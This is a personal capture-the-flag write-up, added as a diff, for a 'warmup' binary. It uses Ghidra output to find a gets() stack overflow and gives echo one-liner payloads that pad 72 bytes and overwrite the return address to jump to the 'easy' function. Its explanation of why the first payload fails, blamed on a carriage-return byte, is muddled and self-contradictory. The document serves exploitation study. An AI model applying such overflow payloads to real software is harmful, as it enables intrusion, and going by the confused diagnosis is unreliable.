@@ -1,0 +1,43 @@
+=== Personal solution description ===
+
+So this one drove me a bit crazy. First, decompile the main function in Ghidra:
+
+-------------------------------------
+	void main(void)
+	{
+	  char local_88 [64];
+	  char local_48 [64];
+	  
+	  write(1,"-Warm Up-\n",10);
+	  write(1,&DAT_0040074c,4);
+	  sprintf(local_88,"%p\n",easy);
+	  write(1,local_88,9);
+	  write(1,&DAT_00400755,1);
+	  gets(local_48);
+	  return;
+	}
+-------------------------------------
+The order of the locals here is a lie, they're actually arranged the other way around on the stack. You can check this with gdb or just by looking the disassembly pane in Ghidra:
+-------------------------------------
+                 undefined main()
+ undefined         AL:1           <RETURN>
+ undefined1        Stack[-0x48]:1 local_48                                XREF[1]:     00400692(*)  
+ undefined1        Stack[-0x88]:1 local_88                                XREF[2]:     0040064d(*), 
+                 main                                                     XREF[5]:     Entry Point(*), 
+-------------------------------------
+So, we need 0x48 (72) bytes of padding, followed by the address of the function we want to jump at.
+The address of easy is always 0x0040060d, as printed by the writes in the main function.
+
+So the solution should simply be:
+$ echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x0d\x06\x40\x00\x00\x00\x00\x00" | ./warmup
+
+This is also what the original nightmare repo solution is. BUT IT DOES NOT WORK! When I debugged it in gdb, it seemed to jump correctly to the easy function, but then it segfaulted in the system call.
+It took me some time, but I asked a friend to also solve it, just in case it was something stupid.
+
+Turns out, the 0x0d byte from the address somehow messes up everything, for SOME reason? It seems to be a '\r', which messes up the input?
+But then how did the execution in gdb correctly jump to the easy function on my machine?
+
+So the correct solution would be:
+$ echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x0e\x06\x40\x00\x00\x00\x00\x00" | ./warmup
+
+Which, by the way, should jump over a (one byte) PUSH RBP instruction and crash the program.
